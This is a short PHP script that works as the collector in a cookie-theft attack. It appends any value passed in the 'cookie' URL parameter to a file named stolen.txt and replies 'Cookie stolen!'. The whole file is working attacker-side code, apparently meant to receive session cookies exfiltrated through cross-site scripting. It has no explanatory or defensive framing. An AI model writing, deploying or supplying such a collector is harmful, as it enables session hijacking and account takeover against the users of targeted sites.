<?php
file_put_contents("stolen.txt", $_GET['cookie'] . "\n", FILE_APPEND);
echo "Cookie stolen!";
?>